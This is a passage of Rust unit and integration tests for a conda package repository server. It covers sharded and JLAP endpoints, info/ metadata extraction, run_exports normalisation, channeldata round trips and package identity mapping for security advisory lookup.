            let app = fx.router_anon(router());
            let (status, body) = tdh::send(
                app,
                tdh::get(format!(
                    "/{key}/linux-64/shards/{hash}.msgpack.zst",
                    key = fx.repo_key
                )),
            )
            .await;

            assert_eq!(
                status,
                StatusCode::OK,
                "a Local conda repo must still serve its own CEP-16 shards"
            );
            assert_eq!(
                &body[..],
                &shard_compressed[..],
                "the served shard must be the content-addressed bytes"
            );
        };

        assertions.await;
        fx.teardown().await;
    }

    // #2915 (5): a Virtual conda repo owns no artifacts -- its MEMBERS do -- and
    // both sharded endpoints plus the JLAP endpoint are built from
    // `list_conda_artifacts(repo.id)` / `build_repodata(repo.id)`, i.e. from the
    // virtual repo's own (always empty) rows. `repodata.json` is correctly
    // aggregated by `build_virtual_repodata`, so all three of these must 404 and
    // send the client there instead of serving an authoritative-looking empty
    // index (CEP-16) or an unmatchable `latest` hash (JLAP).
    #[tokio::test]
    async fn virtual_repo_404s_on_sharded_and_jlap_endpoints() {
        use crate::api::handlers::test_db_helpers as tdh;

        let Some(pool) = tdh::try_pool().await else {
            return;
        };
        let (repo_id, repo_key, storage_dir) = tdh::create_repo(&pool, "virtual", "conda").await;
        sqlx::query("UPDATE repositories SET is_public = true WHERE id = $1")
            .bind(repo_id)
            .execute(&pool)
            .await
            .expect("make repo public");
        let (state, _cache) = state_with_proxy_cache(&pool);

        let hash = well_formed_shard_hash();
        let endpoints = [
            format!("/{repo_key}/noarch/repodata_shards.msgpack.zst"),
            format!("/{repo_key}/noarch/shards/{hash}.msgpack.zst"),
            format!("/{repo_key}/noarch/repodata.json.jlap"),
        ];
        let mut results = Vec::new();
        for uri in &endpoints {
            let app = tdh::router_anon(router(), state.clone());
            let (status, _body) = tdh::send(app, tdh::get(uri.clone())).await;
            results.push((uri.clone(), status));
        }

        cleanup_conda_repo(&pool, repo_id).await;
        let _ = std::fs::remove_dir_all(&storage_dir);

        for (uri, status) in results {
            assert_eq!(
                status,
                StatusCode::NOT_FOUND,
                "{uri} must 404 for a Virtual conda repo instead of serving an empty document"
            );
        }
    }

    // #2915 (3): `cacheable_response` must not add its own gzip on top of a body
    // that already arrived content-coded, and must declare the coding it did
    // arrive with. Double-gzipping while advertising `Content-Encoding: gzip`
    // once produces a body no client can decode.
    #[allow(clippy::disallowed_methods)]
    // streaming-invariant: test module exempt — buffering a 22-byte gzipped JSON
    // body in an assertion is not an artifact path (#1608).
    #[tokio::test]
    async fn cacheable_response_does_not_recompress_already_coded_body() {
        let already_gzipped = gzip_compress(br#"{"repodata_version":1}"#);
        let mut headers = HeaderMap::new();
        headers.insert(ACCEPT_ENCODING, "gzip, deflate".parse().unwrap());

        let resp = cacheable_response_coded(
            already_gzipped.clone(),
            "application/json",
            Some("gzip"),
            &headers,
        )
        .await;

        assert_eq!(resp.status(), StatusCode::OK);
        assert_eq!(
            resp.headers()
                .get(CONTENT_ENCODING)
                .and_then(|v| v.to_str().ok()),
            Some("gzip"),
            "the upstream coding must be forwarded verbatim, exactly once"
        );
        assert_eq!(
            resp.headers()
                .get(CONTENT_LENGTH)
                .and_then(|v| v.to_str().ok()),
            Some(already_gzipped.len().to_string().as_str()),
            "the body must be passed through untouched, not gzipped a second time"
        );
        let body = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .expect("read body");
        assert_eq!(
            &body[..],
            &already_gzipped[..],
            "an already-coded body must be served byte-for-byte"
        );
    }

    // -----------------------------------------------------------------------
    // Full `info/` tree extraction (#4037)
    // -----------------------------------------------------------------------

    /// TEST FIXTURE: a recipe carrying unrendered Jinja. Capturing it verbatim
    /// is the point — parsing belongs to the recipe module, not to ingest.
    const TEST_RECIPE_META_YAML: &str = concat!(
        "{% set version = \"1.26.4\" %}\n",
        "package:\n",
        "  name: numpy\n",
        "  version: {{ version }}\n",
    );

    /// TEST FIXTURE: build an uncompressed tar carrying an arbitrary set of
    /// `info/` members.
    fn build_info_tar(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
        let mut tar_buf = Vec::new();
        {
            let mut builder = tar::Builder::new(&mut tar_buf);
            for (path, bytes) in files {
                let mut header = tar::Header::new_gnu();
                header.set_size(bytes.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                builder.append_data(&mut header, *path, &bytes[..]).unwrap();
            }
            builder.finish().unwrap();
        }
        tar_buf
    }

    /// TEST FIXTURE: a `.conda` (v2) package whose info tar carries an
    /// arbitrary set of `info/` members.
    fn build_test_conda_v2_package_with_info(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
        let compressed_tar =
            zstd::encode_all(std::io::Cursor::new(&build_info_tar(files)), 3).unwrap();

        let mut zip_buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
            let options = zip::write::SimpleFileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            writer.start_file("metadata.json", options).unwrap();
            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
            writer
                .start_file("info-pkg-1.0-build_0.tar.zst", options)
                .unwrap();
            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();
            writer.finish().unwrap();
        }
        zip_buf
    }

    /// TEST FIXTURE: a `.tar.bz2` (v1) package carrying an arbitrary set of
    /// `info/` members.
    fn build_test_conda_v1_package_with_info(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
        bzip2_compress(&build_info_tar(files))
    }

    /// TEST FIXTURE: the complete `info/` tree of a realistic package.
    fn full_info_tree_files() -> Vec<(&'static str, Vec<u8>)> {
        let json = |v: serde_json::Value| serde_json::to_vec(&v).unwrap();
        vec![
            (
                "info/index.json",
                json(serde_json::json!({
                    "name": "numpy",
                    "version": "1.26.4",
                    "build": "py312h02b7e37_0",
                    "build_number": 0,
                    "depends": ["python >=3.12"],
                    "subdir": "linux-64",
                    "license": "BSD-3-Clause",
                })),
            ),
            (
                "info/about.json",
                json(serde_json::json!({
                    "summary": "Fundamental package for array computing",
                    "description": "NumPy is the fundamental package for scientific computing.",
                    "home": "https://numpy.org",
                    "doc_url": "https://numpy.org/doc/stable/",
                    "dev_url": "https://github.com/numpy/numpy",
                    "source_url": "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz",
                    "license": "BSD-3-Clause",
                    "license_family": "BSD",
                })),
            ),
            (
                "info/paths.json",
                json(serde_json::json!({
                    "paths_version": 1,
                    "paths": [
                        {
                            "_path": "lib/python3.12/site-packages/numpy/__init__.py",
                            "path_type": "hardlink",
                            "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
                            "size_in_bytes": 1234,
                        },
                        {
                            "_path": "bin/.numpy-post-link.sh",
                            "path_type": "hardlink",
                            "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
                            "size_in_bytes": 42,
                        },
                    ],
                })),
            ),
            (
                "info/recipe/meta.yaml",
                TEST_RECIPE_META_YAML.as_bytes().to_vec(),
            ),
            (
                "info/link.json",
                json(serde_json::json!({
                    "noarch": { "type": "python", "entry_points": ["f = m:main"] },
                    "package_metadata_version": 1,
                })),
            ),
            (
                "info/run_exports.json",
                json(serde_json::json!({
                    "weak": ["numpy >=1.26.4,<2.0a0"],
                    "strong": [],
                })),
            ),
            (
                "info/hash_input.json",
                json(serde_json::json!({
                    "python": "3.12.* *_cpython",
                    "numpy": "1.26",
                })),
            ),
        ]
    }

    /// Shared assertions over a fully-populated `info/` tree, applied to both
    /// package formats so v1 and v2 cannot drift apart.
    fn assert_full_info_tree(extracted: &serde_json::Value) {
        // index.json still drives the package coordinates.
        assert_eq!(extracted["name"], "numpy");
        assert_eq!(extracted["version"], "1.26.4");

        // info/about.json, promoted flat for channeldata.json (#4038).
        assert_eq!(
            extracted["summary"],
            "Fundamental package for array computing"
        );
        assert_eq!(
            extracted["description"],
            "NumPy is the fundamental package for scientific computing."
        );
        assert_eq!(extracted["home"], "https://numpy.org");
        assert_eq!(extracted["doc_url"], "https://numpy.org/doc/stable/");
        assert_eq!(extracted["dev_url"], "https://github.com/numpy/numpy");
        assert_eq!(
            extracted["source_url"],
            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
        );
        assert_eq!(extracted["license_family"], "BSD");
        // ...and kept whole for anything the flat promotion drops.
        assert_eq!(extracted["about"]["license"], "BSD-3-Clause");

        // info/paths.json: the per-file manifest, hashes intact.
        assert_eq!(extracted["paths"]["source"], "paths.json");
        assert_eq!(extracted["paths"]["has_hashes"], true);
        assert_eq!(extracted["paths"]["file_count"], 2);
        assert_eq!(
            extracted["paths"]["paths"][0]["_path"],
            "lib/python3.12/site-packages/numpy/__init__.py"
        );
        assert_eq!(
            extracted["paths"]["paths"][0]["sha256"],
            "1111111111111111111111111111111111111111111111111111111111111111"
        );
        assert_eq!(extracted["paths"]["paths"][0]["size_in_bytes"], 1234);

        // info/recipe/: raw text, deliberately unparsed.
        assert_eq!(extracted["recipe"]["meta.yaml"], TEST_RECIPE_META_YAML);

        // info/link.json plus the derived install-script flag.
        assert_eq!(extracted["link"]["noarch"]["type"], "python");
        assert_eq!(
            extracted["has_install_scripts"], true,
            "bin/.numpy-post-link.sh in the manifest means the package runs code at install time"
        );

        // info/run_exports.json — the key run_exports.json serves (#4038).
        assert_eq!(extracted["run_exports"]["weak"][0], "numpy >=1.26.4,<2.0a0");

        // info/hash_input.json — the variant inputs behind the build string.
        assert_eq!(extracted["hash_input"]["python"], "3.12.* *_cpython");

        // Presence is recorded explicitly, so "absent" is distinguishable
        // from "never looked at".
        let status = &extracted["info_files"];
        assert_eq!(status["about_json"], "present");
        assert_eq!(status["paths_json"], "present");
        assert_eq!(status["recipe"], "present");
        assert_eq!(status["link_json"], "present");
        assert_eq!(status["run_exports_json"], "present");
        assert_eq!(status["hash_input_json"], "present");
        assert_eq!(
            status["files"], "absent",
            "this package has paths.json, so the legacy info/files list is genuinely absent"
        );
    }

    #[test]
    fn test_extract_conda_v2_reads_full_info_tree() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_v2_metadata(&package).expect("v2 package extracts");
        assert_full_info_tree(&extracted);
    }

    #[test]
    fn test_extract_conda_v1_reads_full_info_tree() {
        let package = build_test_conda_v1_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_v1_metadata(&package).expect("v1 package extracts");
        assert_full_info_tree(&extracted);
    }

    /// Every `info/` member but `index.json` is optional: a package carrying
    /// none of them must still ingest, and must record the absence rather than
    /// leaving the caller unable to tell "no recipe" from "not looked at".
    #[test]
    fn test_extract_conda_bare_index_records_absence() {
        let files = vec![(
            "info/index.json",
            serde_json::to_vec(&serde_json::json!({
                "name": "bare", "version": "1.0", "build": "0", "build_number": 0,
            }))
            .unwrap(),
        )];
        for (label, package) in [
            ("v2", build_test_conda_v2_package_with_info(&files)),
            ("v1", build_test_conda_v1_package_with_info(&files)),
        ] {
            let extracted = extract_conda_metadata(
                &package,
                if label == "v2" {
                    "b.conda"
                } else {
                    "b.tar.bz2"
                },
            )
            .unwrap_or_else(|| panic!("{label} bare package must still ingest"));

            assert_eq!(extracted["name"], "bare", "{label}");
            let status = &extracted["info_files"];
            for slot in [
                "about_json",
                "paths_json",
                "files",
                "recipe",
                "link_json",
                "run_exports_json",
                "hash_input_json",
            ] {
                assert_eq!(
                    status[slot], "absent",
                    "{label} {slot} must be recorded absent"
                );
            }
            assert!(
                extracted.get("run_exports").is_none(),
                "{label}: a package with no run_exports.json must not invent one"
            );
            assert!(
                extracted.get("recipe").is_none(),
                "{label}: a package with no recipe must not invent one"
            );
            assert_eq!(extracted["paths"]["source"], "none", "{label}");
            assert_eq!(extracted["has_install_scripts"], false, "{label}");
        }
    }

    /// Older packages predate `info/paths.json` and carry only `info/files`,
    /// a newline-separated path list with no hashes.
    #[test]
    fn test_paths_json_absent_falls_back_to_hashless_files_list() {
        let files = vec![
            (
                "info/index.json",
                serde_json::to_vec(&serde_json::json!({
                    "name": "old", "version": "0.1", "build": "0", "build_number": 0,
                }))
                .unwrap(),
            ),
            ("info/files", b"bin/oldtool\nlib/libold.so\n".to_vec()),
        ];
        let package = build_test_conda_v1_package_with_info(&files);
        let extracted = extract_conda_v1_metadata(&package).expect("legacy package extracts");

        assert_eq!(extracted["paths"]["source"], "files");
        assert_eq!(
            extracted["paths"]["has_hashes"], false,
            "the info/files fallback carries no hashes and must say so"
        );
        assert_eq!(extracted["paths"]["file_count"], 2);
        assert_eq!(extracted["paths"]["paths"][0]["_path"], "bin/oldtool");
        assert_eq!(extracted["paths"]["paths"][1]["_path"], "lib/libold.so");
        assert!(
            extracted["paths"]["paths"][0].get("sha256").is_none(),
            "the fallback must not fabricate a hash"
        );
        assert_eq!(extracted["info_files"]["paths_json"], "absent");
        assert_eq!(extracted["info_files"]["files"], "present");
    }

    /// `about.json`'s `source_url` is a string for single-source recipes and an
    /// array when the recipe pulls several sources; channeldata carries one
    /// string, so the array form collapses to its first entry.
    #[test]
    fn test_about_source_url_accepts_array_form() {
        let files = vec![
            (
                "info/index.json",
                serde_json::to_vec(&serde_json::json!({
                    "name": "multi", "version": "1.0", "build": "0", "build_number": 0,
                }))
                .unwrap(),
            ),
            (
                "info/about.json",
                serde_json::to_vec(&serde_json::json!({
                    "source_url": [
                        "https://example.invalid/multi-1.0.tar.gz",
                        "https://example.invalid/multi-data-1.0.tar.gz",
                    ],
                }))
                .unwrap(),
            ),
        ];
        let package = build_test_conda_v1_package_with_info(&files);
        let extracted = extract_conda_v1_metadata(&package).expect("extracts");

        assert_eq!(
            extracted["source_url"],
            "https://example.invalid/multi-1.0.tar.gz"
        );
        assert!(
            extracted["about"]["source_url"].is_array(),
            "the raw about.json value must survive alongside the flattened one"
        );
    }

    /// A malformed optional member must not fail the ingest: the package still
    /// lands, and the member is recorded as unreadable rather than absent.
    #[test]
    fn test_malformed_about_json_does_not_fail_ingest() {
        let files = vec![
            (
                "info/index.json",
                serde_json::to_vec(&serde_json::json!({
                    "name": "broken", "version": "1.0", "build": "0", "build_number": 0,
                }))
                .unwrap(),
            ),
            ("info/about.json", b"{ this is not json".to_vec()),
        ];
        let package = build_test_conda_v1_package_with_info(&files);
        let extracted = extract_conda_v1_metadata(&package).expect("ingest must not fail");

        assert_eq!(extracted["name"], "broken");
        assert_eq!(extracted["info_files"]["about_json"], "unreadable");
        assert!(extracted.get("about").is_none());
    }

    /// A `paths.json` past the manifest cap is a bomb-shaped input: it must be
    /// refused and recorded, not buffered, and the package still ingests.
    #[test]
    fn test_oversized_paths_json_is_bounded_and_recorded() {
        let entry = serde_json::json!({
            "_path": "lib/padpadpadpadpadpadpadpadpadpadpadpadpadpadpadpadpadpad.so",
            "path_type": "hardlink",
            "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
            "size_in_bytes": 1,
        });
        let count = (MAX_CONDA_MANIFEST_ENTRY_BYTES as usize / 150) + 5_000;
        let huge = serde_json::json!({
            "paths_version": 1,
            "paths": vec![entry; count],
        });
        let files = vec![
            (
                "info/index.json",
                serde_json::to_vec(&serde_json::json!({
                    "name": "huge", "version": "1.0", "build": "0", "build_number": 0,
                }))
                .unwrap(),
            ),
            ("info/paths.json", serde_json::to_vec(&huge).unwrap()),
        ];
        let package = build_test_conda_v1_package_with_info(&files);
        assert!(
            package.len() < 4 * 1024 * 1024,
            "the compressed bz2 stays small"
        );

        let extracted = extract_conda_v1_metadata(&package).expect("ingest must not fail");
        assert_eq!(extracted["name"], "huge");
        assert_eq!(
            extracted["info_files"]["paths_json"], "unreadable",
            "an over-cap manifest is recorded as unreadable, not silently absent"
        );
        assert_eq!(extracted["paths"]["source"], "none");
    }

    // -----------------------------------------------------------------------
    // #4038: the keys the write path stores are the keys the read paths read
    // -----------------------------------------------------------------------

    /// Round trip: a package carrying run_exports must reach
    /// `run_exports.json` through the persisted metadata document, instead of
    /// every hosted package serving `{}`.
    #[test]
    fn test_run_exports_round_trip_through_persisted_metadata() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");

        // Exactly what store_conda_package persists...
        let persisted = build_conda_metadata(
            "numpy",
            "1.26.4",
            "py312h02b7e37_0",
            "linux-64",
            "conda_v2",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "numpy",
                "1.26.4",
                "py312h02b7e37_0",
                "linux-64",
                "numpy-1.26.4-py312h02b7e37_0.conda",
                Some(&extracted),
            ),
        );

        // ...read back exactly as the run_exports.json handler reads it.
        let served = package_run_exports(Some(&persisted));
        assert_ne!(
            served,
            serde_json::json!({}),
            "run_exports.json must not serve an empty object for a package that has run exports"
        );
        assert_eq!(served["weak"][0], "numpy >=1.26.4,<2.0a0");
    }

    /// Round trip: the about.json fields must reach channeldata.json.
    #[test]
    fn test_channeldata_fields_round_trip_through_persisted_metadata() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        let persisted = build_conda_metadata(
            "numpy",
            "1.26.4",
            "py312h02b7e37_0",
            "linux-64",
            "conda_v2",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "numpy",
                "1.26.4",
                "py312h02b7e37_0",
                "linux-64",
                "numpy-1.26.4-py312h02b7e37_0.conda",
                Some(&extracted),
            ),
        );

        // Every key channeldata.json reads must be present in what we wrote —
        // the #4038 bug was precisely a read/write key mismatch.
        let mut fields: BTreeMap<&'static str, String> = BTreeMap::new();
        merge_channeldata_fields(&mut fields, &persisted);
        for key in CHANNELDATA_METADATA_KEYS {
            assert!(
                fields.contains_key(key),
                "channeldata.json reads `{key}`, but the write path never stored it"
            );
        }
        assert_eq!(fields["summary"], "Fundamental package for array computing");
        assert_eq!(fields["home"], "https://numpy.org");
        assert_eq!(
            fields["source_url"],
            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
        );

        // The virtual-repo channeldata builder reads the same document.
        let entry = build_channeldata_entry(Some("1.26.4"), Some(&persisted));
        assert_eq!(entry["summary"], "Fundamental package for array computing");
        assert_eq!(entry["home"], "https://numpy.org");
        assert_eq!(
            entry["source_url"],
            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
        );
    }

    /// A package with no about.json/run_exports must persist cleanly and serve
    /// the documented empty shapes rather than dropping the upload.
    #[test]
    fn test_bare_package_persists_and_serves_empty_shapes() {
        let files = vec![(
            "info/index.json",
            serde_json::to_vec(&serde_json::json!({
                "name": "bare", "version": "1.0", "build": "0", "build_number": 0,
            }))
            .unwrap(),
        )];
        let package = build_test_conda_v1_package_with_info(&files);
        let extracted = extract_conda_metadata(&package, "bare-1.0-0.tar.bz2").expect("extracts");
        let persisted = build_conda_metadata(
            "bare",
            "1.0",
            "0",
            "noarch",
            "conda_v1",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "bare",
                "1.0",
                "0",
                "noarch",
                "bare-1.0-0.tar.bz2",
                Some(&extracted),
            ),
        );

        assert_eq!(package_run_exports(Some(&persisted)), serde_json::json!({}));
        assert_eq!(persisted["info_files"]["about_json"], "absent");
        assert_eq!(persisted["paths"]["source"], "none");
    }

    /// CEP-12: the per-package `run_exports` member of the served document is
    /// a dict, but a recipe may declare `run_exports` as a bare list of specs,
    /// and packages built before conda-build normalised that spelling carry
    /// the list verbatim in `info/run_exports.json`. conda-build's own
    /// `write_run_exports` defines the list as `{"weak": [...]}`, so that is
    /// what must be persisted and served — never the bare list, which a
    /// CEP-12 client cannot parse as a run-exports dict.
    #[test]
    fn test_legacy_list_run_exports_is_served_as_cep12_dict() {
        let files = vec![
            (
                "info/index.json",
                serde_json::to_vec(&serde_json::json!({
                    "name": "legacy", "version": "1.0", "build": "0", "build_number": 0,
                }))
                .unwrap(),
            ),
            (
                "info/run_exports.json",
                serde_json::to_vec(&serde_json::json!(["libfoo >=1.2,<2.0a0"])).unwrap(),
            ),
        ];
        for (label, package, filename) in [
            (
                "v2",
                build_test_conda_v2_package_with_info(&files),
                "legacy-1.0-0.conda",
            ),
            (
                "v1",
                build_test_conda_v1_package_with_info(&files),
                "legacy-1.0-0.tar.bz2",
            ),
        ] {
            let extracted = extract_conda_metadata(&package, filename)
                .unwrap_or_else(|| panic!("{label} package extracts"));
            assert_eq!(
                extracted["run_exports"],
                serde_json::json!({ "weak": ["libfoo >=1.2,<2.0a0"] }),
                "{label}: a bare list of specs is weak run exports (conda-build's own rule)"
            );
            assert_eq!(
                extracted["info_files"]["run_exports_json"], "present",
                "{label}: normalising is not dropping"
            );

            let persisted = build_conda_metadata(
                "legacy",
                "1.0",
                "0",
                "noarch",
                conda_package_format(filename),
                "d41d8cd98f00b204e9800998ecf8427e",
                Some(&extracted),
                fixture_identity("legacy", "1.0", "0", "noarch", filename, Some(&extracted)),
            );
            let served = package_run_exports(Some(&persisted));
            assert_eq!(
                served,
                serde_json::json!({ "weak": ["libfoo >=1.2,<2.0a0"] }),
                "{label}: run_exports.json must serve the CEP-12 dict, not the legacy list"
            );
        }
    }

    /// A metadata document persisted while the legacy list was stored verbatim
    /// still reads back as the CEP-12 dict, so already-hosted packages are
    /// corrected without a republish.
    #[test]
    fn test_package_run_exports_normalizes_a_previously_stored_list() {
        let stored = serde_json::json!({
            "name": "legacy",
            "version": "1.0",
            "run_exports": ["libfoo >=1.2,<2.0a0"],
        });
        assert_eq!(
            package_run_exports(Some(&stored)),
            serde_json::json!({ "weak": ["libfoo >=1.2,<2.0a0"] })
        );
        // The modern dict spelling passes through untouched.
        let modern = serde_json::json!({
            "run_exports": { "strong": ["libbar 2.*"], "weak": ["libbar >=2.0,<3.0a0"] },
        });
        assert_eq!(
            package_run_exports(Some(&modern)),
            serde_json::json!({ "strong": ["libbar 2.*"], "weak": ["libbar >=2.0,<3.0a0"] })
        );
    }

    /// The manifest is persisted whole, so the per-file index this epic builds
    /// next can look a path up by name and get its hash.
    #[test]
    fn test_persisted_manifest_supports_per_file_lookup() {
        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
            .expect("extracts");
        let persisted = build_conda_metadata(
            "numpy",
            "1.26.4",
            "py312h02b7e37_0",
            "linux-64",
            "conda_v2",
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                "numpy",
                "1.26.4",
                "py312h02b7e37_0",
                "linux-64",
                "numpy-1.26.4-py312h02b7e37_0.conda",
                Some(&extracted),
            ),
        );

        let found = persisted["paths"]["paths"]
            .as_array()
            .expect("the manifest is persisted as an array of entries")
            .iter()
            .find(|e| e["_path"] == "lib/python3.12/site-packages/numpy/__init__.py")
            .expect("a packaged file is findable by path");
        assert_eq!(
            found["sha256"],
            "1111111111111111111111111111111111111111111111111111111111111111"
        );
    }

    // -----------------------------------------------------------------------
    // #4041/#4042: a stored conda package carries an identity the advisory
    // path can actually query with
    // -----------------------------------------------------------------------

    /// The identity document `store_conda_package` persists for these
    /// coordinates. Tests go through this rather than hand-building an input,
    /// so a fixture cannot drift from what uploads actually write.
    fn fixture_identity(
        pkg_name: &str,
        pkg_version: &str,
        build_string: &str,
        subdir: &str,
        filename: &str,
        extracted: Option<&serde_json::Value>,
    ) -> serde_json::Value {
        CondaIdentity::resolve(
            conda_identity_input(
                pkg_name,
                pkg_version,
                build_string,
                subdir,
                filename,
                "test-channel",
                extracted,
            ),
            &conda_identity::AliasMap::builtin_only(),
        )
        .to_document()
    }

    /// Persist one package the way `store_conda_package` does, and read the
    /// identity back the way the advisory path does.
    fn stored_identity(
        pkg_name: &str,
        pkg_version: &str,
        build_string: &str,
        subdir: &str,
        filename: &str,
        extracted: serde_json::Value,
    ) -> conda_identity::StoredIdentity {
        let persisted = build_conda_metadata(
            pkg_name,
            pkg_version,
            build_string,
            subdir,
            conda_package_format(filename),
            "d41d8cd98f00b204e9800998ecf8427e",
            Some(&extracted),
            fixture_identity(
                pkg_name,
                pkg_version,
                build_string,
                subdir,
                filename,
                Some(&extracted),
            ),
        );
        conda_identity::read_identity(&persisted)
            .expect("every stored conda package carries an identity")
    }

    /// #4041: the purl names one build, not the set of every build of this
    /// version. Subdir and build string are what distinguish them.
    #[test]
    fn test_stored_conda_package_carries_a_purl_naming_the_build() {
        let stored = stored_identity(
            "numpy",
            "1.26.4",
            "py311h5f1cd34_0",
            "linux-64",
            "numpy-1.26.4-py311h5f1cd34_0.conda",
            serde_json::json!({ "name": "numpy", "version": "1.26.4" }),
        );

        assert_eq!(
            stored.conda_purl.as_deref(),
            Some(
                "pkg:conda/numpy@1.26.4?build=py311h5f1cd34_0&channel=test-channel\
                 &subdir=linux-64&type=conda"
            )
        );
    }

    /// #4041: a noarch package is ONE artifact. Uploading it under a platform
    /// subdir must not give it that platform's identity, or the same package
    /// is counted once per subdir it was published to.
    #[test]
    fn test_noarch_package_uploaded_under_a_platform_subdir_keeps_one_identity() {
        let as_declared = stored_identity(
            "requests",
            "2.31.0",
            "pyhd8ed1ab_0",
            "noarch",
            "requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
            serde_json::json!({ "noarch": "python" }),
        );
        let under_linux = stored_identity(
            "requests",
            "2.31.0",
            "pyhd8ed1ab_0",
            "linux-64",
            "requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
            serde_json::json!({ "noarch": "python" }),
        );

        assert_eq!(as_declared.conda_purl, under_linux.conda_purl);
        let purl = as_declared.conda_purl.expect("purl");
        assert!(purl.contains("subdir=noarch"), "{purl}");
        assert!(!purl.contains("linux-64"), "{purl}");
    }

    /// The legacy boolean spelling of `noarch` is the same fact as the modern
    /// string one, and must collapse the subdir the same way.
    #[test]
    fn test_legacy_boolean_noarch_declaration_is_understood() {
        let stored = stored_identity(
            "six",
            "1.16.0",
            "pyh6c4a22f_0",
            "linux-64",
            "six-1.16.0-pyh6c4a22f_0.tar.bz2",
            serde_json::json!({ "noarch": true }),
        );
        assert!(
            stored.conda_purl.expect("purl").contains("subdir=noarch"),
            "`noarch: true` is a noarch package"
        );
    }

    /// A platform package must NOT be collapsed: the `linux-64` build and the
    /// `osx-arm64` build vendor different native libraries and have different
    /// CVE surfaces.
    #[test]
    fn test_platform_packages_stay_distinct_per_subdir() {
        let linux = stored_identity(
            "numpy",
            "1.26.4",
            "py311h5f1cd34_0",
            "linux-64",
            "numpy-1.26.4-py311h5f1cd34_0.conda",
            serde_json::json!({ "noarch": false }),
        );
        let mac = stored_identity(
            "numpy",
            "1.26.4",
            "py311h7aedaa7_0",
            "osx-arm64",
            "numpy-1.26.4-py311h7aedaa7_0.conda",
            serde_json::json!({}),
        );
        assert_ne!(linux.conda_purl, mac.conda_purl);
    }

    /// #4042: the defect. `pkg:conda/py-opencv` matches nothing anywhere, but
    /// PyPI `opencv-python` has coverage in both OSV and GHSA — so the stored
    /// identity has to carry the PyPI name the advisory path queries with.
    #[test]
    fn test_stored_conda_package_carries_pypi_aliases_for_advisory_lookup() {
        let stored = stored_identity(
            "py-opencv",
            "4.9.0",
            "py312h1234abc_0",
            "linux-64",
            "py-opencv-4.9.0-py312h1234abc_0.conda",
            serde_json::json!({ "name": "py-opencv" }),
        );

        assert_eq!(stored.status(), "mapped");
        assert_eq!(
            stored.pypi_advisory_targets(),
            vec![("opencv-python".to_string(), "4.9.0".to_string())],
            "conda content must inherit PyPI advisory coverage under the PyPI name"
        );
        assert_eq!(
            stored.pypi_purls(),
            vec!["pkg:pypi/opencv-python@4.9.0".to_string()]
        );
        assert!(!stored.is_known_unknown());
    }

    /// A package nothing maps is a known unknown. It must be recorded as one,
    /// not left looking like a package that was queried and came back clean.
    #[test]
    fn test_unmapped_conda_package_is_recorded_as_unmapped() {
        let stored = stored_identity(
            "acme-internal-toolkit",
            "0.4.2",
            "h1234567_0",
            "linux-64",
            "acme-internal-toolkit-0.4.2-h1234567_0.conda",
            serde_json::json!({}),
        );

        assert_eq!(stored.status(), "unmapped");
        assert!(
            stored.is_known_unknown(),
            "nothing was asked, so nothing being found means nothing"
        );
        assert!(stored.pypi_advisory_targets().is_empty());
        match stored.pypi {
            conda_identity::StoredPypiCoverage::Unmapped { reason } => assert!(
                reason.contains("acme-internal-toolkit"),
                "the gap names the package: {reason}"
            ),
            other => panic!("expected Unmapped, got {other:?}"),
        }
    }

    /// The distinction the whole design turns on, asserted at the persistence
    /// boundary: `zlib` ships no PyPI distribution, so no PyPI advisory for it
    /// is a real answer — where the unmapped package above was never asked.
    /// Both carry zero PyPI names.
    #[test]
    fn test_not_python_package_is_distinguishable_from_an_unmapped_one() {
        let native = stored_identity(
            "zlib",
            "1.3.1",
            "hb9d3cd8_2",
            "linux-64",
            "zlib-1.3.1-hb9d3cd8_2.conda",
            serde_json::json!({}),
        );
        let unknown = stored_identity(
            "acme-internal-toolkit",
            "0.4.2",
            "h1234567_0",
            "linux-64",
            "acme-internal-toolkit-0.4.2-h1234567_0.conda",
            serde_json::json!({}),
        );

        assert_eq!(native.status(), "not_python");
        assert_eq!(unknown.status(), "unmapped");
        assert_eq!(
            native.pypi_advisory_targets(),
            unknown.pypi_advisory_targets(),
            "both have nothing to query"
        );
        assert!(
            !native.is_known_unknown() && unknown.is_known_unknown(),
            "but only one of them was actually answered"
        );
    }

    /// A conda artifact stored before this path existed has no identity block.
    /// That is its own known unknown — not a clean package.
    #[test]
    fn test_metadata_without_an_identity_block_reads_as_absent() {
        let legacy = serde_json::json!({
            "name": "numpy",
            "version": "1.26.4",
            "subdir": "linux-64",
        });
        assert!(
            conda_identity::read_identity(&legacy).is_none(),
            "a pre-#4041 metadata document has no identity to read"
        );
    }

